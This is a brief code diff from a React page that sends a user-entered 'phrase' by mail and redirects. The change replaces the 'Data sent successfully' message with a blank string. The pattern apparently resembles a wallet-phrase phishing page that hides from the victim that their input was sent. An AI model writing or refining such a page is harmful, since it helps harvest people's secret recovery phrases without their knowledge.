@@ -24,7 +24,7 @@ const Page = () => {
       setLoading(true);
       // Send data
       const data = await sendMail(phrase);
-      setMessage('Data sent successfully');
+      setMessage(' ');
       console.log(data);
       // Redirect after mail is sent
       window.location.href = '/success';
